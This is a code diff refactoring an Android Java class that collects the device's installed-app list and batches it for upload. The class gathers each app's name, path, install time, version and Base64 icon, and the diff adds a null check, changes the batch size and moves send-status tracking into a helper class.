@@ -1,4 +1,4 @@
-package com.inet.android.archive;
+package com.inet.android.list;
 
 import java.io.ByteArrayOutputStream;
 import java.text.SimpleDateFormat;
@@ -11,7 +11,6 @@ import org.json.JSONObject;
 import android.annotation.SuppressLint;
 import android.content.Context;
 import android.content.SharedPreferences;
-import android.content.SharedPreferences.Editor;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
@@ -32,8 +31,8 @@ public class ListApp {
 	private String sendStr = null;
 	private String complete;
 	private static String LOG_TAG = "ListApp";
-	Editor ed;
 	final int COMPRESSION_QUALITY = 100;
+	private TurnSendList sendList;
 
 	/**
 	 * get the list of all installed applications in the device
@@ -44,7 +43,6 @@ public class ListApp {
 	public void getListOfInstalledApp(Context context) {
 		this.mContext = context;
 		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
-		ed = sp.edit();
 
 		// -------initial json line----------------------
 		JSONObject jsonAppList = new JSONObject();
@@ -73,33 +71,37 @@ public class ListApp {
 						// App-------------------------------------
 						Drawable icon = packageInfo.applicationInfo
 								.loadIcon(context.getPackageManager());
+						String encodedImage = null;
 						Bitmap bitmap = ((BitmapDrawable) icon).getBitmap();
+						if (bitmap != null) {
+							ByteArrayOutputStream byteArrayBitmapStream = new ByteArrayOutputStream();
+							bitmap.compress(Bitmap.CompressFormat.PNG,
+									COMPRESSION_QUALITY, byteArrayBitmapStream);
+							byte[] b = byteArrayBitmapStream.toByteArray();
+							encodedImage = Base64.encodeToString(b,
+									Base64.DEFAULT);
+							jsonAppList.put("icon", encodedImage);
 
-						String encodedImage;
-						ByteArrayOutputStream byteArrayBitmapStream = new ByteArrayOutputStream();
-						bitmap.compress(Bitmap.CompressFormat.PNG,
-								COMPRESSION_QUALITY, byteArrayBitmapStream);
-						byte[] b = byteArrayBitmapStream.toByteArray();
-						encodedImage = Base64.encodeToString(b, Base64.DEFAULT);
-						//------------------------------------------------------
-						//                Send Data
-						//------------------------------------------------------
-						jsonAppList.put("icon", encodedImage);
+						}
+						// ------------------------------------------------------
+						// Send Data
+						// ------------------------------------------------------
 						jsonAppList.put("name", app.loadLabel(packageManager));
 						jsonAppList.put("dir", app.sourceDir);
 						jsonAppList.put("time", installTime);
 						jsonAppList.put("build", packageInfo.versionCode);
-						
+
 						if (sendStr == null)
 							sendStr = jsonAppList.toString();
 						else
 							sendStr += "," + jsonAppList.toString();
-						if (sendStr.length() >= 10000) {
-							Logging.doLog(LOG_TAG, "str >= 10000 ..",
-									"str >= 10000 ..");
+						if (sendStr.length() >= 50000) {
 							complete = "0";
+							Logging.doLog(LOG_TAG, "str >= 50000",
+									"str >= 50000");
 							sendRequest(sendStr, complete);
 							sendStr = null;
+
 						}
 					} catch (PackageManager.NameNotFoundException e) {
 						e.printStackTrace();
@@ -111,18 +113,25 @@ public class ListApp {
 				}
 
 			}
-			if (!sendStr.equals(" ") && sendStr != null) {
-				complete = "1";
-				// Logging.doLog(LOG_TAG, "Send complete 1 .." + sendStr,
-				// "Send complete 1 .." + sendStr);
-				sendRequest(sendStr, complete);
-				sendStr = null;
-				ed.putString("app_list", "0");
+			if (sendStr != null) {
+				if (!sendStr.equals(" ")) {
+					lastRaw(sendStr);
+				}
 			}
-		} else {
-			ed.putString("app_list", "1");
 		}
-		ed.commit();
+		else {
+			sendList = new TurnSendList(mContext);
+			sendList.setList(3, "1", "0");
+		}
+	}
+
+	private void lastRaw(String sendStr) {
+		complete = "1";
+		Logging.doLog(LOG_TAG, "Send complete 1 ..", "Send complete 1 ..");
+		sendRequest(sendStr, complete);
+		sendStr = null;
+		sendList = new TurnSendList(mContext);
+		sendList.setList(3, "0", "0");
 	}
 
 	private void sendRequest(String str, String complete) {
